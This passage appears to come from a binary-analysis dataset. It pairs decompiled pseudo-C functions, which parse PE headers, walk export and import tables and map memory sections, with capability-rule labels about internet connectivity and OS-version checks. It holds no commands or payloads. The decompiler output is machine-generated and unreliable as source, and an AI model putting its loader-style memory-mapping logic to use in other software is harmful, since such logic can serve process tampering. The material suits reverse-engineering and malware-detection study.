auStack104);\n                                        bVar3 = true;\n                                    }\n                                }\n                                iVar7 = *(iVar6 + 0x3c) + iVar6;\n                                if (acStackX16[0] == '\\x01') {\n                                    uStack328 = *(iVar7 + 0x34);\n                                }\n                                else {\n                                    uStack328 = *(iVar7 + 0x30);\n                                }\n                                iVar4 = fcn.00049e30(iStack320, &uStack328, &uStack296);\n                                if (iVar4 == 0) {\n                                    iVar4 = fcn.0004a104(iVar6, uStack328);\n                                    if (iVar4 == 0) {\n                                        iVar4 = fcn.00049dfc(iStack320, uStack328, iVar6, uStack296 & 0xffffffff);\n                                        if (iVar4 == 0) {\n                                            bVar2 = false;\n                                            if (arg1 != 0) {\n                                                arg2_00 = fcn.0002fbc4(0x428);\n                                                puStack288 = arg2_00;\n                                                if (arg2_00 == NULL) {\n                                                    iVar4 = 0x21590004;\n                                                    bVar2 = false;\n                                                    goto code_r0x0004d32e;\n                                                }\n                                                *arg2_00 = uStack328;\n                                                arg2_00[2] = *(iVar7 + 0x28) + uStack328;\n                                                *(arg2_00 + 1) = *(iVar7 + 0x50);\n                                                *(arg2_00 + 0xc) = *(iVar7 + 8);\n                                                if (iStackX24 == 0) {\n                                                    *(arg2_00 + 3) = 0;\n                                                }\n                                                else {\n                                                    fcn.00061a3e(arg2_00 + 3, iStackX24, 0x104);\n                                                    *(arg2_00 + 0x21e) = 0;\n                                                }\n                                                if (iStackX32 == 0) {\n                                                    *(arg2_00 + 0x44) = 0;\n                                                }\n                                                else {\n                                                    fcn.00061a3e(arg2_00 + 0x44, iStackX32, 0x104);\n                                                    *(arg2_00 + 0x426) = 0;\n                                                }\n                                                iVar4 = fcn.0004bc50(arg1, arg2_00, acStackX16);\n                                                if (iVar4 != 0) {\n                                                    bVar2 = false;\n                                                    goto code_r0x0004d32e;\n                                                }\n                                                bVar2 = true;\n                                            }\n                                            iVar4 = fcn.0004b1dc(arg1, iVar6);\n                                            if (iVar4 == 0) {\n                                                bVar1 = true;\n                                                iVar4 = fcn.00049dfc(iStack320, uStack328, iVar6, uStack296 & 0xffffffff\n                                                                    );\n                                                if (iVar4 == 0) {\n                                                    if (*(iVar7 + 0x28) != 0) {\n                                                        uVar5 = *(iVar7 + 0x28);\n                                                        iStack280 = 0;\n                                                        fcn.00061a56(auStack272, 0, 0x9f);\n                                                        iVar7 = uVar5 + uStack328;\n                                                        if (iVar7 == 0) {\n                                                            iVar4 = 0x21590066;\n                                                            goto code_r0x0004d32e;\n                                                        }\n                                                        if (uStack328 == 0) {\n                                                            iVar4 = 0x21590067;\n                                                            goto code_r0x0004d32e;\n                                                        }\n                                                        uStack181 = 1;\n                                                        uStack177 = uStack328;\n                                                        uStack169 = 1;\n                                                        iStack280 = iVar7;\n                                                        uStack257 = arg1;\n                                                        iVar4 = fcn.0004eae8(&iStack280);\n                                                        if (iVar4 != 0) goto code_r0x0004d32e;\n                                                    }\n                                                    fcn.0004ab84(arg1, acStackX16);\n                                                    iVar4 = 0;\n                                                }\n                                            }\n                                        }\n                                        else {\n                                            bVar2 = false;\n                                            arg2_00 = puVar8;\n                                        }\n                                    }\n                                    else {\n                                        bVar2 = false;\n                                        arg2_00 = puVar8;\n                                    }\n                                }\n                                else {\n                                    bVar2 = false;\n                                    arg2_00 = puVar8;\n                                }\n                            }\n                            else {\n                                bVar2 = false;\n                                arg2_00 = puVar8;\n                            }\n                        }\n                    }\n                    else {\n                        iVar4 = 0x21590206;\n                        bVar2 = false;\n                        arg2_00 = puVar8;\n                    }\n                }\n                else {\n                    bVar2 = false;\n                }\n            }\n        }\n        else {\n            iVar4 = 0x21590065;\n            arg2_00 = puVar8;\n        }\n    }\ncode_r0x0004d32e:\n    if (iVar4 == 0) {\n        if (in_stack_00000028 != NULL) {\n            *in_stack_00000028 = uStack328;\n        }\n    }\n    else {\n        if (bVar1) {\n            fcn.0004ee74(arg1, uStack328);\n        }\n        else if (uStack328 != 0) {\n            if (bVar2) {\n                fcn.0004c2f0(arg1, uStack328);\n            }\n            fcn.00049f00(iStack320, uStack328);\n        }\n        if (in_stack_00000028 != NULL) {\n            *in_stack_00000028 = 0;\n        }\n    }\n    if (iStack320 != 0) {\n        fcn.000619de();\n    }\n    fcn.0002fc50(iVar6);\n    fcn.0002fc50(arg2_00);\n    if (iStack304 != 0) {\n        if (bVar3) {\n            (**0x113a8)(auStack104);\n        }\n        (*_fcn.000115b0)(iStack304);\n    }\n    return iVar4;\n}\n",
        "token_count": 2231
    },
    "0004d89c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0004d89c(uint32_t *arg1)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    ulong *arg3;\n    uint32_t uVar3;\n    int16_t *piVar4;\n    int16_t *arg1_00;\n    int64_t iVar5;\n    uint64_t uVar6;\n    ulong uVar7;\n    int16_t *piVar8;\n    int16_t *piVar9;\n    uint auStackX8 [2];\n    int64_t iStackX16;\n    int64_t iStackX24;\n    int64_t iStackX32;\n    uint64_t in_stack_ffffffffffffff20;\n    uint uVar10;\n    ulong in_stack_ffffffffffffff28;\n    uint uVar11;\n    uint uVar12;\n    uint uVar13;\n    ulong uStack168;\n    uchar auStack160 [16];\n    uchar auStack144 [16];\n    uint auStack128 [2];\n    ulong uStack120;\n    uchar *puStack112;\n    uint uStack104;\n    ulong uStack96;\n    ulong uStack88;\n    \n    uVar11 = in_stack_ffffffffffffff28 >> 0x20;\n    piVar8 = *(arg1 + 2);\n    uVar2 = *arg1;\n    arg3 = *(arg1 + 4);\n    arg1_00 = NULL;\n    iStackX24 = 0;\n    iStackX32 = 0;\n    iStackX16 = 0;\n    uStack168 = 0;\n    if (piVar8 == NULL) {\ncode_r0x0004dd4d:\n        arg1[6] = 0x21590066;\n        return;\n    }\n    iVar5 = -1;\n    piVar4 = piVar8;\n    do {\n        if (iVar5 == 0) break;\n        iVar5 = iVar5 + -1;\n        iVar1 = *piVar4;\n        piVar4 = piVar4 + 1;\n    } while (iVar1 != 0);\n    if (iVar5 == -2) goto code_r0x0004dd4d;\n    if (arg3 == NULL) {\n        arg1[6] = 0x21590067;\n        return;\n    }\n    *arg3 = 0;\n    piVar4 = fcn.0002fbc4(0x212);\n    if (piVar4 == NULL) {\n        uVar3 = 0x21590004;\n        goto code_r0x0004d929;\n    }\n    fcn.00061a3e(piVar4, piVar8, 0x104);\n    piVar4[0x104] = 0;\n    iVar5 = fcn.00061a44(piVar4, 0x2e);\n    if ((iVar5 == 0) || (*(iVar5 + 2) == 0x5c)) {\n        iVar5 = 0;\n        piVar8 = piVar4;\n        do {\n            iVar5 = iVar5 + -1;\n            piVar9 = piVar8;\n            if (iVar5 == 0) break;\n            piVar9 = piVar8 + 1;\n            iVar1 = *piVar8;\n            piVar8 = piVar9;\n        } while (iVar1 != 0);\n        *(piVar9 + -1) = *0x15da8;\n        piVar9[3] = *0x15db0;\n    }\n    auStackX8[0] = 0;\n    uVar3 = fcn.0004a77c(uVar2, piVar4, 0x212, auStackX8);\n    if (uVar3 == 0) {\n        iVar5 = fcn.00061a44(piVar4, 0x5c);\n        piVar8 = piVar4;\n        if (iVar5 != 0) {\n            piVar8 = iVar5 + 2;\n        }\n        uVar3 = fcn.0004d428(uVar2, piVar8, arg3);\n        if (uVar3 != 0) {\n            fcn.000619f0(auStack160, piVar4);\n            puStack112 = auStack160;\n            uVar13 = 0;\n            uVar7 = CONCAT44(uVar11, 7);\n            in_stack_ffffffffffffff20 = in_stack_ffffffffffffff20 & 0xffffffff00000000;\n            uVar11 = 0;\n            uStack120 = 0;\n            uStack96 = 0;\n            uStack88 = 0;\n            auStack128[0] = 0x30;\n            uStack104 = 0x240;\n            uVar3 = fcn.0001dda0(&iStackX24, 0x80000000, auStack128, auStack144, 0, in_stack_ffffffffffffff20, uVar7, 1\n                                 , 0x40, 0, 0);\n            uVar12 = uVar7 >> 0x20;\n            uVar10 = in_stack_ffffffffffffff20 >> 0x20;\n            if (uVar3 == 0) {\ncode_r0x0004dbfa:\n                auStack128[0] = 0x30;\n                uStack120 = 0;\n                uStack104 = 0x200;\n                puStack112 = NULL;\n                uStack96 = 0;\n                uStack88 = 0;\n                uVar3 = fcn.00061b46(&iStackX32, 0xf001f, auStack128, 0, CONCAT44(uVar11, 2), \n                                     CONCAT44(uVar10, 0x8000000), iStackX24);\n                if (uVar3 == 0) {\n                    iStackX16 = 0;\n                    uVar3 = fcn.00061b40(iStackX32, 0xffffffffffffffff, &iStackX16, 0, 0, 0, &uStack168, 2, 0, \n                                         CONCAT44(uVar13, 2));\n                    if (uVar3 == 0) {\n                        uVar3 = fcn.0004ce28(uVar2, iStackX16, piVar8, piVar4);\n                    }\n                }\n            }\n            else {\n                arg1_00 = NULL;\n                if (piVar8 == piVar4) {\n                    arg1_00 = fcn.0002fbc4(0x208);\n                    if (arg1_00 == NULL) {\n                        uVar3 = 0x21590004;\n                    }\n                    else {\n                        uVar3 = fcn.0002f598(arg1_00, 0x104);\n                        if ((uVar3 == 0) && (uVar3 = fcn.00049d34(0xffffffffffffffff, auStackX8),  uVar3 == 0)) {\n                            uVar6 = 0xffffffffffffffff;\n                            uVar7 = 0x15d20;\n                            piVar9 = arg1_00;\n                            do {\n                                if (uVar6 == 0) break;\n                                uVar6 = uVar6 - 1;\n                                iVar1 = *piVar9;\n                                piVar9 = piVar9 + 1;\n                            } while (iVar1 != 0);\n                            if (auStackX8[0] != '\\0') {\n                                uVar7 = 0x15d08;\n                            }\n                            fcn.00061ab0(arg1_00, uVar7, 0x104 - (~uVar6 - 1));\n                            uVar6 = 0xffffffffffffffff;\n                            piVar9 = arg1_00;\n                            do {\n                                if (uVar6 == 0) break;\n                                uVar6 = uVar6 - 1;\n                                iVar1 = *piVar9;\n                                piVar9 = piVar9 + 1;\n                            } while (iVar1 != 0);\n                            fcn.00061ab0(arg1_00, piVar4, 0x104 - (~uVar6 - 1));\n                            arg1_00[0x103] = 0;\n                            fcn.000619f0(auStack160, arg1_00);\n                            uVar13 = 0;\n                            puStack112 = auStack160;\n                            in_stack_ffffffffffffff20 = in_stack_ffffffffffffff20 & 0xffffffff00000000;\n                            auStack128[0] = 0x30;\n                            uStack120 = 0;\n                            uVar11 = 0;\n                            uStack104 = 0x240;\n                            uStack96 = 0;\n                            uStack88 = 0;\n                            uVar3 = fcn.0001dda0(&iStackX24, 0x80000000, auStack128, auStack144, 0, \n                                                 in_stack_ffffffffffffff20, CONCAT44(uVar12, 7), 1, 0x40, 0, 0);\n                            uVar10 = in_stack_ffffffffffffff20 >> 0x20;\n                            if (uVar3 == 0) goto code_r0x0004dbfa;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    fcn.0002fc50(arg1_00);\n    if (iStackX16 != 0) {\n        fcn.00061b3a(0xffffffffffffffff);\n    }\n    if (iStackX32 != 0) {\n        fcn.000619de();\n    }\n    if (iStackX24 != 0) {\n        fcn.000619de();\n    }\n    fcn.0002fc50(piVar4);\ncode_r0x0004d929:\n    arg1[6] = uVar3;\n    return;\n}\n",
        "token_count": 2146
    },
    "0004e25c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0004e25c(int64_t arg1, int64_t arg2, int64_t arg3, ulong arg4)\n\n{\n    uint32_t *puVar1;\n    uint16_t *arg2_00;\n    char cVar2;\n    int64_t *arg4_00;\n    int32_t iVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    int64_t arg3_00;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t *puVar8;\n    char *in_stack_00000030;\n    uint16_t in_stack_00000038;\n    unkbyte6 in_stack_0000003a;\n    int64_t *in_stack_00000040;\n    uint32_t uStack168;\n    uint32_t uStack164;\n    uint32_t uStack160;\n    uint32_t uStack156;\n    int64_t iStack152;\n    int64_t iStack144;\n    int64_t iStack136;\n    int64_t iStack128;\n    uchar auStack120 [16];\n    int16_t iStack104;\n    uint32_t uStack100;\n    uint32_t uStack96;\n    uint32_t uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    \n    arg4_00 = CONCAT62(in_stack_0000003a, in_stack_00000038);\n    arg3_00 = 0;\n    if ((((arg4_00 == NULL) || (arg2 == 0)) || (arg3 == 0)) || (in_stack_00000040 == NULL)) {\n        return 0x21590008;\n    }\n    *in_stack_00000040 = arg3;\n    puVar8 = arg2 + 0x78;\n    if (*(arg2 + 0x18) != 0x10b) {\n        puVar8 = arg2 + 0x88;\n    }\n    uVar7 = *puVar8;\n    if (uVar7 == 0) {\n        return 0x21590005;\n    }\n    iVar6 = uVar7 + puVar8[1];\n    if (arg1 == 0) {\n        fcn.000619f6(auStack120, arg3 + uVar7, 0x28);\n    }\n    else {\n        iVar3 = fcn.0002fb84(arg1, arg3 + uVar7, auStack120);\n        if (iVar3 != 0) goto code_r0x0004e687;\n    }\n    iStack152 = uStack84 + arg3;\n    iStack144 = uStack88 + arg3;\n    iStack128 = uStack92 + arg3;\n    arg3_00 = fcn.0002fbc4(0x104);\n    if (arg3_00 == 0) {\n        iVar3 = 0x21590004;\n        goto code_r0x0004e687;\n    }\n    if ((in_stack_00000030 & 0xffffffffffff0000) == 0) {\n        in_stack_00000038 = in_stack_00000030 - iStack104;\n        if (in_stack_00000038 <= uStack100) {\n            puVar1 = uStack92 + arg3 + in_stack_00000038 * 4;\n            if (arg1 == 0) {\n                uStack164 = *puVar1;\n            }\n            else {\n                iVar3 = fcn.0002fb84(arg1, puVar1, &uStack164);\n                if (iVar3 != 0) goto code_r0x0004e687;\n            }\n            if ((uStack164 < *puVar8) || (*puVar8 + puVar8[1] <= uStack164)) {\n                iVar3 = 0;\n                *arg4_00 = uStack164 + arg3;\n            }\n            else {\n                uVar7 = iVar6 - uStack164;\n                if (0x104 < uVar7) {\n                    uVar7 = 0x104;\n                }\n                iVar5 = uStack164 + arg3;\n                if (arg1 == 0) {\n                    fcn.000619f6(arg3_00, iVar5, uVar7);\n                }\n                else {\n                    iVar3 = fcn.0002fb84(arg1, iVar5, arg3_00);\n                    if (iVar3 != 0) goto code_r0x0004e687;\n                }\n                iVar3 = fcn.0004e130(arg4, arg3, arg3_00, arg4_00);\n            }\n            goto code_r0x0004e687;\n        }\n    }\n    else {\n        uVar4 = 0;\n        iVar5 = -1;\n        uStack168 = 0;\n        do {\n            if (iVar5 == 0) break;\n            iVar5 = iVar5 + -1;\n            cVar2 = *in_stack_00000030;\n            in_stack_00000030 = in_stack_00000030 + 1;\n        } while (cVar2 != '\\0');\n        uVar7 = ~iVar5 - 1;\n        uStack156 = 0x103;\n        if (uVar7 < 0x103) {\n            uStack156 = uVar7;\n        }\n        iStack136 = uStack156;\n        if (uStack96 != 0) {\n            do {\n                arg2_00 = iStack152 + uVar4 * 2;\n                if (arg1 == 0) {\n                    in_stack_00000038 = *arg2_00;\n                }\n                else {\n                    iVar3 = fcn.0002fb84(arg1, arg2_00, &stack0x00000038);\n                    if (iVar3 != 0) goto code_r0x0004e687;\n                }\n                puVar1 = iStack128 + in_stack_00000038 * 4;\n                if (arg1 == 0) {\n                    uStack164 = *puVar1;\n                }\n                else {\n                    iVar3 = fcn.0002fb84(arg1, puVar1, &uStack164);\n                    if (iVar3 != 0) goto code_r0x0004e687;\n                }\n                puVar1 = iStack144 + uStack168 * 4;\n                if (arg1 == 0) {\n                    uStack160 = *puVar1;\n                }\n                else {\n                    iVar3 = fcn.0002fb84(arg1, puVar1, &uStack160);\n                    if (iVar3 != 0) goto code_r0x0004e687;\n                }\n                if (uStack156 < iVar6 - uStack160) {\n                    if (arg1 == 0) {\n                        fcn.000619f6(arg3_00);\n                    }\n                    else {\n                        iVar3 = fcn.0002fb84(arg1, uStack160 + arg3, arg3_00);\n                        if (iVar3 != 0) goto code_r0x0004e687;\n                    }\n                    if ((*(iStack136 + arg3_00) == '\\0') && (iVar3 = fcn.00061a80(),  iVar3 == 0)) {\n                        if ((uStack164 < *puVar8) || (*puVar8 + puVar8[1] <= uStack164)) {\n                            iVar3 = 0;\n                            *arg4_00 = arg3 + uStack164;\n                        }\n                        else {\n                            uVar7 = iVar6 - uStack164;\n                            if (0x104 < uVar7) {\n                                uVar7 = 0x104;\n                            }\n                            iVar5 = uStack164 + arg3;\n                            if (arg1 == 0) {\n                                fcn.000619f6(arg3_00, iVar5, uVar7);\n                            }\n                            else {\n                                iVar3 = fcn.0002fb84(arg1, iVar5, arg3_00);\n                                if (iVar3 != 0) goto code_r0x0004e687;\n                            }\n                            iVar3 = fcn.0004e130(arg4, arg3, arg3_00, arg4_00);\n                        }\n                        if (uStack168 < uStack96) goto code_r0x0004e687;\n                        break;\n                    }\n                }\n                uStack168 = uStack168 + 1;\n                uVar4 = uStack168;\n            } while (uStack168 < uStack96);\n        }\n    }\n    iVar3 = 0x21590005;\ncode_r0x0004e687:\n    fcn.0002fc50(arg3_00);\n    return iVar3;\n}\n",
        "token_count": 1896
    },
    "0004e984": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0004e984(int64_t arg1)\n\n{\n    int32_t iVar1;\n    ulong arg3;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    char acStackX8 [8];\n    int64_t iStackX16;\n    ulong uStackX24;\n    int64_t iStackX32;\n    \n    iStackX16 = 0;\n    iVar1 = fcn.00049f40(&uStackX24, 0x47a, *(arg1 + 0x17));\n    if (iVar1 == 0) {\n        iVar1 = fcn.00049d80(uStackX24, acStackX8);\n        if (iVar1 == 0) {\n            *(arg1 + 0x2b) = 1;\n            *(arg1 + 0xc) = acStackX8[0];\n            *(arg1 + 0x1b) = uStackX24;\n            if (acStackX8[0] == '\\0') {\n                uVar2 = 0xa5;\n                arg3 = 0x665e0;\n            }\n            else {\n                uVar2 = 0xfe;\n                arg3 = 0x664e0;\n            }\n            uVar3 = uVar2;\n            iStackX32 = uVar3 + 0x14e;\n            iVar1 = fcn.00049e30(uStackX24, &iStackX16, &iStackX32);\n            if (iVar1 == 0) {\n                iVar1 = fcn.00049dfc(uStackX24, iStackX16, arg3, uVar2);\n                if (iVar1 == 0) {\n                    *(arg1 + 0x23) = iStackX16;\n                    iVar1 = fcn.0004e8d4(arg1);\n                    if (iVar1 == 0) {\n                        iVar1 = fcn.00049dfc(uStackX24, uVar3 + 0xa7 + iStackX16, arg1, 0xa7);\n                        if (iVar1 == 0) {\n                            *(arg1 + 0x33) = uVar3 + 0xa7 + iStackX16;\n                            iVar1 = fcn.0004df8c(arg1);\n                        }\n                    }\n                }\n            }\n        }\n    }\n    if ((iStackX16 != 0) && (*(arg1 + 0x2b) != 0)) {\n        iStackX32 = 0;\n        fcn.00061be2(uStackX24, &iStackX16, &iStackX32, 0x8000);\n    }\n    fcn.000619de(uStackX24);\n    return iVar1;\n}\n",
        "token_count": 605
    },
    "0004eae8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0004eae8(code **arg1)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    \n    if (*(arg1 + 0x17) != 0) {\n        uVar2 = fcn.0004d428(*(arg1 + 0x17), 0x15d90, arg1 + 0xf);\n        if (uVar2 != 0) {\n            return uVar2;\n        }\n        if (((*(arg1 + 99) != 0) && (*(arg1 + 0x6f) == 0)) &&\n           (uVar2 = fcn.0004e868(*(arg1 + 0x17), *(arg1 + 0xf), 0x15dd8, arg1 + 0x9f),  uVar2 != 0)) {\n            return uVar2;\n        }\n    }\n    if (*(arg1 + 0x17) == 0) {\n        if (*(arg1 + 99) == 0) {\n            uVar2 = (**arg1)(*(arg1 + 0x67), *(arg1 + 0x6f));\n        }\n        else {\n            iVar1 = (**arg1)(*(arg1 + 0x67), *(arg1 + 0x6f), 0);\n            uVar2 = (iVar1 != 0) - 1;\n        }\n    }\n    else {\n        uVar2 = fcn.0004e984(arg1);\n    }\n    return uVar2;\n}\n",
        "token_count": 339
    },
    "0004ec6c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0004ec6c(uint32_t *arg1)\n\n{\n    uint32_t uVar1;\n    uint32_t auStackX16 [2];\n    int64_t aiStackX24 [2];\n    int16_t aiStack360 [30];\n    int32_t iStack300;\n    int32_t aiStack296 [10];\n    uint32_t uStack256;\n    \n    aiStackX24[0] = 0;\n    if (*(arg1 + 2) == 0) {\n        uVar1 = 0x21590065;\n    }\n    else if (*arg1 == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.0004b974(*arg1, *(arg1 + 2), auStackX16);\n        if (uVar1 == 0) {\n            if (auStackX16[0] == 0) {\n                uVar1 = 0;\n            }\n            else if (auStackX16[0] == 0xffffffff) {\n                uVar1 = 0;\n            }\n            else {\n                if (auStackX16[0] != 0) {\n                    uVar1 = fcn.0004c898(*arg1, *(arg1 + 2));\n                    if (uVar1 != 0) goto code_r0x0004ee54;\n                }\n                if (auStackX16[0] < 2) {\n                    uVar1 = fcn.00049f40(aiStackX24, 0x18, *arg1);\n                    if (uVar1 == 0) {\n                        uVar1 = fcn.00049dcc(aiStackX24[0], *(arg1 + 2), aiStack360, 0x40);\n                        if (uVar1 == 0) {\n                            if (aiStack360[0] == 0x5a4d) {\n                                uVar1 = fcn.00049dcc(aiStackX24[0], iStack300 + *(arg1 + 2), aiStack296, 0x108);\n                                if (uVar1 == 0) {\n                                    if (aiStack296[0] == 0x4550) {\n                                        fcn.000619de();\n                                        aiStackX24[0] = 0;\n                                        if ((*(arg1 + 4) != '\\0') && (uStack256 != 0)) {\n                                            uVar1 = fcn.0004ebe8(*arg1, *(arg1 + 2) + uStack256, *(arg1 + 2), 0);\n                                            if (uVar1 != 0) goto code_r0x0004ee54;\n                                        }\n                                        uVar1 = fcn.0004c2f0(*arg1, *(arg1 + 2));\n                                        if (uVar1 == 0) {\n                                            uVar1 = fcn.0004ef68(*arg1, aiStack296, *(arg1 + 2));\n                                        }\n                                    }\n                                    else {\n                                        uVar1 = 0xffffffff;\n                                    }\n                                }\n                            }\n                            else {\n                                uVar1 = 0xffffffff;\n                            }\n                        }\n                    }\n                }\n                else {\n                    uVar1 = 0;\n                }\n            }\n        }\n    }\ncode_r0x0004ee54:\n    if (aiStackX24[0] != 0) {\n        fcn.000619de();\n    }\n    arg1[5] = uVar1;\n    return;\n}\n",
        "token_count": 763
    },
    "0004ef68": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0004ef68(ulong arg1, int64_t arg2, int64_t arg3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int64_t arg2_00;\n    int64_t iVar3;\n    int64_t iStackX32;\n    ulong uStack344;\n    uchar auStack336 [12];\n    uint32_t uStack324;\n    char acStack312 [272];\n    \n    iStackX32 = 0;\n    iVar3 = 0;\n    if (*(arg2 + 0x18) == 0x10b) {\n        iVar3 = arg2;\n    }\n    if (iVar3 == 0) {\n        uVar1 = *(arg2 + 0x90);\n    }\n    else {\n        uVar1 = *(arg2 + 0x80);\n    }\n    arg2_00 = uVar1 + arg3;\n    if (arg2_00 == arg3) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = fcn.00049f40(&iStackX32, 0x18, arg1);\n        if (iVar2 == 0) {\n            while( true ) {\n                iVar2 = fcn.00049dcc(iStackX32, arg2_00, auStack336, 0x14);\n                if (iVar2 != 0) break;\n                if (uStack324 == 0) {\n                    fcn.00049f00(iStackX32, arg3);\n                    iVar2 = 0;\n                    break;\n                }\n                iVar2 = fcn.00049dcc(iStackX32, arg3 + uStack324, acStack312, 0x104);\n                if (iVar2 != 0) break;\n                if (acStack312[0] != '\\0') {\n                    if (iVar3 != 0) {\n                        iVar2 = 0x2159000d;\n                        break;\n                    }\n                    iVar2 = fcn.0004dd68(arg1, acStack312, &uStack344);\n                    if (iVar2 == 0) {\n                        fcn.0004c898(arg1, uStack344);\n                        fcn.0004ee74(arg1, uStack344);\n                    }\n                    arg2_00 = arg2_00 + 0x14;\n                }\n            }\n        }\n    }\n    if (iStackX32 != 0) {\n        fcn.000619de();\n    }\n    return iVar2;\n}\n",
        "token_count": 546
    },
    "0004f0e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0004f0e8(int64_t arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    \n    if (arg2 == 1) {\n        uVar2 = 0x10;\n        bVar3 = *(arg1 + 0x133) == '\\x10';\n    }\n    else {\n        if (arg2 == 2) {\n            return *(arg1 + 0x133);\n        }\n        if (arg2 == 3) {\n            return (*(arg1 + 0x133) != '\\x10') + 4;\n        }\n        if (arg2 == 6) {\n            if (*(arg1 + 0x133) == 0x10) {\n                return 0x20;\n            }\n            return *(arg1 + 0x133);\n        }\n        if (arg2 != 7) {\n            return arg2;\n        }\n        uVar2 = 0x40;\n        bVar3 = *(arg1 + 0xac) == '@';\n    }\n    uVar1 = 0x20;\n    if (bVar3) {\n        uVar1 = uVar2;\n    }\n    return uVar1;\n}\n",
        "token_count": 277
    },
    "0004f160": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0004f160(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint8_t in_R8B;\n    \n    iVar1 = fcn.0004f0e8(arg1, arg2);\n    if (iVar1 == 4) {\ncode_r0x0004f1cf:\n        iVar1 = in_R8B + 0x15;\n    }\n    else {\n        if (iVar1 != 5) {\n            if (iVar1 == 8) {\n                if (((*(arg1 + 0xac) == '@') && (*(arg1 + 0x129) != '\\0')) && (3 < in_R8B)) {\n                    return in_R8B + 5;\n                }\n                return in_R8B + 1;\n            }\n            if (iVar1 == 0x10) goto code_r0x0004f1cf;\n            if (iVar1 != 0x20) {\n                if (iVar1 != 0x40) {\n                    return 0;\n                }\n                return in_R8B + 0x35;\n            }\n        }\n        iVar1 = in_R8B + 0x25;\n    }\n    return iVar1;\n}\n",
        "token_count": 270
    },
    "0004f1dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0004f1dc(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    uint32_t uVar1;\n    \n    if (arg2 - 0x26U < 8) {\n        uVar1 = (*(arg1 + 0x129) & 1) << 3 | arg2 - 0x26U;\n    }\n    else {\n        uVar1 = arg2 - 0x1e;\n    }\n    if (*(arg1 + 0x133) == '\\x10') {\n        return uVar1 + 0x15;\n    }\n    if ((*(arg1 + 0xac) != ' ') &&\n       (((*(arg1 + 0x133) != ' ' || ((*(arg1 + 0x129) & 8) != 0)) || (*(arg1 + 0x132) != '\\0')))) {\n        return uVar1 + 0x35;\n    }\n    return uVar1 + 0x25;\n}\n",
        "token_count": 223
    },
    "0004f30c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
